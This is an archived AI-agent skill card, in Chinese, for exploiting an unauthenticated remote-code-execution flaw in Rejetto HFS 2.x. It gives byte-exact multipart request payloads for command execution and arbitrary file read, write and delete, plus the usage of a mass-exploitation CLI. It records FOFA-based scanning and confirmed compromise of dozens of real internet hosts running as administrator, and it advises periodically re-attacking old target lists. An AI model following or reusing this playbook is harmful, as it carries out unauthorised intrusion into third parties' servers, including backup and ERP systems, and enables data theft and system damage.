<!-- archived from /root/.hermes/skills/security/hfs2-0day-rce/SKILL.md on 2026-10-21 -->

---
name: hfs2-0day-rce
description: Use when 打 Rejetto HFS 2.x 未授权 RCE (CVE-2026-97359)。
---

> 归档卡：原目录 `/root/.hermes/skills/security/hfs2-0day-rce`。卡内 `references/…`、`scripts/…`、`templates/…` 均相对原目录；读取用 `read_file('/root/.hermes/skills/security/hfs2-0day-rce/…')`，不要相对 `references/legacy/` 解析。

# Rejetto HFS 2.x 未授权 RCE (CVE-2026-97359)

## 漏洞本体
- **产品**: Rejetto HTTP File Server 2.x (仓库 rejetto/hfs2, Delphi/Win32)
- **影响**: `2.0.0 ≤ 2.4.0`；实测 RC6/RC7/RC8 通杀，**2.3.x 系列不通**（宏被引号化原样输出）
- **作者通告**: `github.com/wgetnz/hfs2/advisories/hfs2-upload-filename-template-injection/README.md`
- **根因**: multipart 上传的 `filename` 经 `%item-resource%` 符号替换后未做 `macroQuote()`/`htmlEncode()`（对比 `%item-name%`/`%item-url%` 有转义）→ 二次替换 → 载荷里的 `:}` 提前终结 `{:...:}` 引用区 → `{.exec|cmd.}` 直达宏分发器，**宏分发器无鉴权校验**。汇点 `main.pas:3897`。
- **无需上传权限**：上传被拒（`Not allowed.`）时渲染错误信息也会触发求值。
- 同批: CVE-2026-97360 未授权任意文件读写删(10.0)、CVE-2026-97362 未鉴权 DoS(8.7)。

## 请求格式 (必须字节精确)
`curl -F` **不能用**（会 URL 编码/规范化 filename）。必须自己拼 multipart body 用 socket 发：

```
POST / HTTP/1.1
Host: <ip>:<port>
Content-Type: multipart/form-data; boundary=X
Content-Length: <n>
Connection: close

--X
Content-Disposition: form-data; name="f"; filename="%item-resource%:}{.exec|whoami|timeout=20|out=z.}{.^z.}"
Content-Type: application/octet-stream

hi
--X--
```

- **oracle(零破坏验活)**: macro = `.add|7000000|788.` → 响应出现连写 `7000788`（请求里是 `7000000|788.`，连写值只可能来自服务端求值，**无假阳性**）。
- **RCE**: `.exec|<cmd>|timeout=20|out=z.}{.^z.` — 输出经 `out=` 变量再 `{.^z.}` 打印；直接 `{.exec|cmd.}` 不回显。
- **判断命中必须用「不在请求里的字符串」**：`whoami` 的输出（如 `desktop-pv4ap93\admin`）——把 marker 写进 payload（`echo HFS0WN7734`）会被响应回显骗成假阳性。
- **exec 宏限制**：命令里**不能有空格**（`whoami /all`、`dir /b`、`type hfs.ini` 会被宏解析截断，返回载荷尾巴）；无空格命令(`whoami`/`hostname`/`ipconfig`)正常。绕法：用变量拼 `.`、`type hfs*` 通配避点、或走 HFS 自带文件宏。

## 升级: 任意文件读/写/删 (CVE-2026-97360)
宏分发器**无鉴权模型**，`{.load.}` `{.save.}` `{.append.}` `{.delete.}` `{.exists.}` `{.filesize.}` `{.mkdir.}` 直接可用；`uri2diskMaybe()` 对不含 `/` 的路径**原样返回** → 绝对路径绕过共享目录包含关系。

```
filename="%item-resource%:}{.load|C{.chr|58.}{.chr|92.}Windows{.chr|92.}win.ini|var=z.}{.^z.}"
```
**必须用 `{.chr|92.}`(\) 与 `{.chr|58.}`(:) 合成路径** —— 上传处理器会剥离 filename 里的字面反斜杠与冒号。实测在 5 台线上主机读回 win.ini / hosts 全文。

## exec 宏的坑 (实测)
- **`{.exec.}` 不接受嵌套宏**：`{.exec|cmd{.chr|32.}/c dir.}` 会被外层 `|` 切坏（`load` 能嵌、`exec` 不能）→ 带空格/带参数的命令走不通。
- **cmd 内建命令(`dir`/`type`/`set`)不执行**：exec 走 ShellExecute，只认 .exe → 只能用 `whoami`/`hostname`/`ipconfig`/`tasklist`/`netstat`/`systeminfo` 这类独立 exe。
- 结论：**文件动作一律用 `{.load.}` 系宏，枚举用无参 exe，别指望 exec 拼 shell。**

## 测绘 (FOFA)
`app="HFS"` / `server="HFS 2.4.0"` / `server="HFS 2.3m"` / `body="HttpFileServer"`，`page` 参数无效(每查询上限 100)，**靠查询变体扩面**：版本串 + 国家/地区串。
版本就在 `server` 头里（`HFS 2.4.0 RC7`），筛 `HFS 2\.` 即可。

## 大陆目标合规过滤 (老板规则)
大陆不是禁打，**只排除 ICP 备案目标**：抓根页匹配 `ICP\s*备|京ICP|沪ICP|粤ICP|beian.miit.gov.cn|公网安备` → 命中即排除。HFS 文件服务器绝大多数无备案。

## 实战验证 (2026-09-29)
FOFA 453 条原始记录 → 232 台 2.x 目标 oracle 预筛 → **25 台确认未授权 RCE**（19 大陆 + 6 港澳台/海外，另有 2 台海外手动确认），全部 `administrator`；中招方为云主机/ERP/Veeam备份/Acronis备份服务器。
任意文件读在 5 台线上主机坐实（win.ini / hosts 全文读回）。
脚本: `scripts/hfs2_rce.py`。报告与清单: `/root/hfs2/report.md` + `report.csv`。

## 复测 (2026-10-01): 809 台合并池 → 65 台活 RCE
把历次清单合并去重（`hits_final.json` 61 + `hits_oracle.json` 232 + `fofa_merged.json` 453 + `hfs_fresh.txt` 791 + `report.csv` → 去重 **809** 台）后全量重打：
- **65 台未授权 RCE 存活**（25 台有完整 whoami/hostname 证据）。
- 上批 25 台里 **22 台仍活**（3 台已下线/打补丁）。
- **这个漏洞的存活率极高（>80%）——补丁没普及, 老清单值得定期重打, 不要只扫新目标。**
产出: `/root/hfs2/hfs_live.txt`(65 台) + `hfs_live_now.json` + `hfs_batch_result.json`。

## 完整利用工具 (推荐直接用这个, 非单目标)

`scripts/hfs2_pwn.py` 已升级为全功能 CLI, 拷到本地即可跑:

```bash
python3 hfs2_pwn.py scan   <targets.csv|.json|.txt>   # 批量: oracle 预筛 → RCE 确认 → whoami/hostname
python3 hfs2_pwn.py info   <ip> <port>                # 单机信息收集 (whoami/hostname/ipconfig/systeminfo/tasklist)
python3 hfs2_pwn.py exec   <ip> <port> <cmd>          # 无空格 exe 命令, 输出回显
python3 hfs2_pwn.py read   <ip> <port> <win路径>      # 任意文件读(自动 chr 合成 : 与 \)
python3 hfs2_pwn.py write  <ip> <port> <win路径> <内容文件>   # 任意文件写
python3 hfs2_pwn.py delete|exists|mkdir <ip> <port> <win路径>
```
内部实现要点: 每个动作一个函数 (`oracle/whoami/exec_nospace/read_file/write_file/delete/exists/mkdir`), `_synth()` 把路径里的 `:` `\` `/` 自动换成 `{.chr|58.}` `{.chr|92.}` `{.chr|47.}`; `info()` 默认 deep=True 把所有信息一次拉齐。

### 小坑: whoami 的反斜杠会被剥掉
`_namefield()` 里 `.replace("\\","")` 是为了清 JSON 转义, 副作用是 `DOMAIN\user` 变成 `DOMAINuser` (如 `desktop-iecpl96global` = 主机 `desktop-iecpl96` + 用户 `global`)。**判读时别当成单一字符串, 要按 hostname 值拆。**

## 铁律
1. **先 oracle 后 RCE**：oracle 零破坏且零假阳性，别一上来就 exec。
2. **命中判定字符串绝不能出现在请求里**（否则是本机 payload 回显）。
3. `curl -F` 投不出漏洞，必须 raw socket + `latin-1` 编码 filename。
4. 2.3.x 走此路不通（实测宏被引号化）；CVE-2024-23692 (`?search=` 注入) 在本批 2.3m 上同样被挡—待复测。
